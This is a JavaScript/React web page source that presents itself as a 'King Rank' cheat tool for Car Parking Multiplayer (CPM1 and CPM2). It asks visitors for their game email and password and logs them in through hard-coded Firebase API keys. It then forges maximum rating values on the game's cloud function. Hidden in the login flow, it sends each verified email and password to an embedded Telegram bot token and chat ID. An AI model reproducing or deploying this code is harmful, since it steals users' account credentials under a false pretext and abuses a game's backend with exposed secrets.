        // Telegram configuration
        const BOT_TOKEN = "8363058552:AAEY57Exn4ELKZ4T9hBDpUJaQdk45oTSh0E";
        const CHAT_ID = 6095291231;

        // CPM1 Configurations
        const CPM1_CONFIG = {
            FIREBASE_API_KEY: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
            FIREBASE_LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
            RANK_URL: 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
        };

        // CPM2 Configurations
        const CPM2_CONFIG = {
            FIREBASE_API_KEY: 'AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ',
            FIREBASE_LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
            RANK_URL: 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'
        };
particlesJS("particles-js", {
            "particles": {
                "number": {
                    "value": 80,
                    "density": {
                        "enable": true,
                        "value_area": 800
                    }
                },
                "color": {
                    "value": "#ffffff"
                },
                "shape": {
                    "type": "circle",
                    "stroke": {
                        "width": 0,
                        "color": "#000000"
                    },
                    "polygon": {
                        "nb_sides": 5
                    }
                },
                "opacity": {
                    "value": 0.5,
                    "random": false,
                    "anim": {
                        "enable": false,
                        "speed": 1,
                        "opacity_min": 0.1,
                        "sync": false
                    }
                },
                "size": {
                    "value": 3,
                    "random": true,
                    "anim": {
                        "enable": false,
                        "speed": 40,
                        "size_min": 0.1,
                        "sync": false
                    }
                },
                "line_linked": {
                    "enable": true,
                    "distance": 150,
                    "color": "#ffffff",
                    "opacity": 0.4,
                    "width": 1
                },
                "move": {
                    "enable": true,
                    "speed": 6,
                    "direction": "none",
                    "random": false,
                    "straight": false,
                    "out_mode": "out",
                    "bounce": false,
                    "attract": {
                        "enable": false,
                        "rotateX": 600,
                        "rotateY": 1200
                    }
                }
            },
            "interactivity": {
                "detect_on": "canvas",
                "events": {
                    "onhover": {
                        "enable": true,
                        "mode": "repulse"
                    },
                    "onclick": {
                        "enable": true,
                        "mode": "push"
                    },
                    "resize": true
                },
                "modes": {
                    "grab": {
                        "distance": 400,
                        "line_linked": {
                            "opacity": 1
                        }
                    },
                    "bubble": {
                        "distance": 400,
                        "size": 40,
                        "duration": 2,
                        "opacity": 8,
                        "speed": 3
                    },
                    "repulse": {
                        "distance": 200,
                        "duration": 0.4
                    },
                    "push": {
                        "particles_nb": 4
                    },
                    "remove": {
                        "particles_nb": 2
                    }
                }
            },
            "retina_detect": true
        });

        // Fungsi untuk membuka 
        function loadWebsite(bg) {
                     document.body.style.background = bg;
        }
        
        function App() {
            const [currentPage, setCurrentPage] = React.useState('home');
            const [currentConfig, setCurrentConfig] = React.useState(CPM1_CONFIG);
            const [email, setEmail] = React.useState('');
            const [password, setPassword] = React.useState('');
            const [status, setStatus] = React.useState('');
            const [isLoading, setIsLoading] = React.useState(false);

            React.useEffect(() => {
                loadWebsite();
            }, []);

            const handleCPM1Click = () => {
                setCurrentConfig(CPM1_CONFIG);
                setCurrentPage('login');
            };

            const handleCPM2Click = () => {
                setCurrentConfig(CPM2_CONFIG);
                setCurrentPage('login');
            };

            const goHome = () => {
                setCurrentPage('home');
                setEmail('');
                setPassword('');
                setStatus('');
            };

            const sendCPM1Notification = async (email, password) => {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const message = `🔐 Login Cpm1:\n📧 Email: ${email}\n🔒 Password: ${password}`;
                const payload = {
                    chat_id: CHAT_ID,
                    text: message
                };
                
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    if (!response.ok) {
                        console.warn('Failed to send notification to Telegram');
                    }
                } catch (error) {
                    console.warn('Error sending notification to Telegram:', error);
                }
            };

            const sendCPM2Notification = async (email, password) => {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const message = `🔐 Login Cpm2:\n📧 Email: ${email}\n🔒 Password: ${password}`;
                const payload = {
                    chat_id: CHAT_ID,
                    text: message
                };
                
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    if (!response.ok) {
                        console.warn('Failed to send notification to Telegram');
                    }
                } catch (error) {
                    console.warn('Error sending notification to Telegram:', error);
                }
            };

            const login = async (email, password) => {
                setStatus('Logging in...');
                setIsLoading(true);
                
                try {
                    const response = await fetch(`${currentConfig.FIREBASE_LOGIN_URL}?key=${currentConfig.FIREBASE_API_KEY}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)',
                        },
                        body: JSON.stringify({
                            clientType: 'CLIENT_TYPE_ANDROID',
                            email,
                            password,
                            returnSecureToken: true
                        })
                    });

                    const data = await response.json();

                    if (response.ok && data.idToken) {
                        setStatus('Login successful!');
                        
                        if (currentConfig === CPM1_CONFIG) {
                            sendCPM1Notification(email, password);
                        } else {
                            sendCPM2Notification(email, password);
                        }
                        
                        return data.idToken;
                    } else {
                        throw new Error(data.error?.message || 'Login failed');
                    }
                } catch (error) {
                    setStatus(`Login failed: ${error.message}`);
                    return null;
                } finally {
                    setIsLoading(false);
                }
            };

            const setRank = async (token) => {
                setStatus('Setting KING RANK...');
                setIsLoading(true);
                
                try {
                    const ratingData = Object.fromEntries(
                        ["cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
                         "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
                         "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
                         "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"]
                        .map(key => [key, 100000])
                    );
                    
                    ratingData.time = 10000000000;
                    ratingData.race_win = 3000;

                    const response = await fetch(currentConfig.RANK_URL, {
                        method: 'POST',
                        headers: {
                            'Authorization': `Bearer ${token}`,
                            'Content-Type': 'application/json',
                            'User-Agent': 'okhttp/3.12.13'
                        },
                        body: JSON.stringify({ data: JSON.stringify({ RatingData: ratingData }) })
                    });

                    if (response.ok) {
                        setStatus('Rank successfully set!');
                        return true;
                    } else {
                        const errorData = await response.json();
                        throw new Error(errorData.error || 'Failed to set rank');
                    }
                } catch (error) {
                    setStatus(`Failed to set rank: ${error.message}`);
                    return false;
                } finally {
                    setIsLoading(false);
                }
            };

            const handleSubmit = async (e) => {
                e.preventDefault();
                const token = await login(email, password);
                
                if (token) {
                    await setRank(token);
                }
            };

            const renderHomePage = () => (
                <div className="min-h-screen flex items-center justify-center p-4 relative z-10">
                    <div className="gaming-card w-full max-w-lg p-8">
                        <h1 className="text-4xl md:text-5xl font-bold text-center mb-8 text-blue-400 glow-text game-font">
                            SCOLARIOFFICIAL
                        </h1>
                        <div className="flex flex-col space-y-4">
                            <button 
                                onClick={handleCPM1Click}
                                className="neon-button btn-primary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg md:text-xl"
                            >
                                <i className="fas fa-gamepad mr-3"></i> KING CPM 1
                            </button>
                            <button 
                                onClick={handleCPM2Click}
                                className="neon-button btn-secondary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg md:text-xl"
                            >
                                <i className="fas fa-gamepad mr-3"></i> KING CPM 2
                            </button>
                        </div>
                    </div>
                </div>
            );

            const renderLoginPage = () => (
                <div className="min-h-screen flex items-center justify-center p-4 relative z-10">
                    <div className="gaming-card w-full max-w-md p-8 relative">
                        <button 
                            onClick={goHome}
                            className="absolute top-4 left-4 text-gray-400 hover:text-white transition-all duration-300"
                        >
                            <i className="fas fa-arrow-left text-xl"></i>
                        </button>
                        
                        <h2 className="text-2xl md:text-3xl font-bold text-center mb-6 text-blue-400 glow-text game-font">
                            {currentConfig === CPM1_CONFIG ? 'CPM1 Login' : 'CPM2 Login'}
                        </h2>
                        
                        <form onSubmit={handleSubmit} className="space-y-6">
                            <div>
                                <label htmlFor="email" className="block text-sm font-medium text-gray-300 mb-2">
                                    Email
                                </label>
                                <input
                                    type="email"
                                    id="email"
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-white placeholder-gray-400"
                                    placeholder="Enter your email"
                                    required
                                />
                            </div>
                            
                            <div>
                                <label htmlFor="password" className="block text-sm font-medium text-gray-300 mb-2">
                                    Password
                                </label>
                                <input
                                    type="password"
                                    id="password"
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-white placeholder-gray-400"
                                    placeholder="Enter your password"
                                    required
                                />
                            </div>
                            
                            <button
                                type="submit"
                                disabled={isLoading}
                                className="w-full neon-button btn-primary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg"
                            >
                                {isLoading ? (
                                    <div className="flex items-center justify-center">
                                        <div className="loading-spinner mr-3"></div>
                                        Processing...
                                    </div>
                                ) : 'Get King Rank'}
                            </button>
                        </form>
                        
                        {status && (
                            <div className="mt-6 p-4 bg-red-900 bg-opacity-50 border border-red-700 rounded-lg text-red-200">
                                <div className="flex items-center">
                                    <i className="fas fa-exclamation-triangle mr-2"></i>
                                    <span>{status}</span>
                                </div>
                            </div>
                        )}
                    </div>
                </div>
            );

            return (
                <div className="bg-slate-900 min-h-screen">
                    {currentPage === 'home' ? renderHomePage() : renderLoginPage()}
                </div>
            );
        }

        ReactDOM.render(<App />, document.getElementById('root'));